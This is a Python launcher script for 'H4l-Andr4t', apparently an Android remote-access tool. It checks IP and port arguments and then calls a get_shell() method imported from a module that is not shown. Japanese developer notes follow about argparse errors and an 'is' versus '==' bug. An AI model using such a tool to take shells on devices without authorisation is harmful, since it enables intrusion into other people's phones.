import sys
import argparse
from pathlib import Path

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\console')
from console import Console

parent_dir = str(Path(__file__).parent.parent)
sys.path.append(parent_dir + r'\andr4t')
from andr4t import Andr4t

#  _   _ _  _   _              _              _      _  _   _
# | | | | || | | |            / \   _ __   __| |_ __| || | | |_
# | |_| | || |_| |  _____    / _ \ | '_ \ / _` | '__| || |_| __|
# |  _  |__   _| | |_____|  / ___ \| | | | (_| | |  |__   _| |_
# |_| |_|  |_| |_|         /_/   \_\_| |_|\__,_|_|     |_|  \__|
#                                                   coded by H4l

def __args_analyze_ip(args):
    # "-a"はIPアドレス引数の先頭字
    ARG_IP_ADDRESS_PREFIX = "-a"

    IP_ADDRESS_OCTET_MAX = 4

    IP_ADDRESS_MIN = 0
    IP_ADDRESS_MAX = 255
    
    if(not args[1] == ARG_IP_ADDRESS_PREFIX):
        print('Please enter "-a" as the first character.')
        return False

    iplist=args[2].split('.')

    if(not len(iplist) is IP_ADDRESS_OCTET_MAX):
        Console.print("There is a mistake in the description of the IP address.")
        return False

    for ip in iplist:
        try:
            if(IP_ADDRESS_MIN > int(ip) or
                IP_ADDRESS_MAX < int(ip)):
                Console.print("error")
                return False
        except Exception as e:
            Console.print(e)
            return False
    return True

def __args_analyze_port(args):
    # "-p"はport番号引数の先頭字
    ARG_port_ADDRESS_PREFIX = "-p"

    if(not args[3] == ARG_port_ADDRESS_PREFIX):
        print('Please enter "-p" as the first character.')
        return False
    
    try:
        int(args[4])
    except:
        Console.print("Please enter only numerical values for the port number")
        return False
    
    return True

def get_args():
    parser = argparse.ArgumentParser(description="Get command line arguments")   #パーサー作成
    parser.add_argument("arg1",help="-a",type=str)   #引数設定
    parser.add_argument("arg2",help="IP address",type=str)
    parser.add_argument("arg3",help="-p",type=str)
    parser.add_argument("arg4",help="TCP port number",type=str)
    args = parser.parse_args()   #引数解析
    return args

def sys_args():
    args = sys.argv
    return args

def main() -> None:
    """
    メイン処理
    """
    #args = sys.argv   #sysによる引数の取得。argsにリストで格納
    # TODO args parserを用いて、socket通信用のip, portを指定する。

    args = sys_args()

    if(not __args_analyze_ip(args) or
        not __args_analyze_port(args)):
        return False

    ip=args[2]
    port=int(args[4])
    
    android = Andr4t(ip,port) #androidはAndr4tのインスタンス
    android.get_shell()

if (__name__ == "__main__"):

    main()

"""
    ・args parser
    args parserでの動作確認はエラーにより失敗。
    調査結果、引数が未設定とのエラーだが-hコマンドによる確認では設定済みと出力され、原因解明できず。
    そのため今回はsysモジュールを使った設計を行った。動作は単純であり、今回の場合はこちらのほうが適しているかもしれない。

    args parserの動作確認がしたい場合は以下の関数呼び出しを変更すると良い
    86:   args = sys_args()   =>   args = get_args()

    また、変数名も変更する必要もある
    29:   args[1]   =>   args.arg1
    33:   args[2]   =>   args.arg2
    54:   args[3]   =>   args.arg3
    59:   args[4]   =>   args.arg4
    92:   args[2]   =>   args.arg2
    93:   args[4]   =>   args.arg4

    ・Console.printについて
    色々思考したがどうしてもエラーを吐いてしまった為、printで記述。後日修正したい。
    
    ・isに付いて
    デバッグ中、29行目と59行目のif文が誤動作した。原因はisにあるのではないかと考える。
    条件式前後にprintを挟み、変数の内部についてデバッグをおこなったが正常であった。
    isを==に置き換えて動作確認を行ったところ正常に動作した。
    isと==は全く一緒のものではないのか、はたまたプログラムの記述方法に誤りがあったのかは不明...

    ・結果
    sysによる動作結果は[SUCCESS]であった。
    """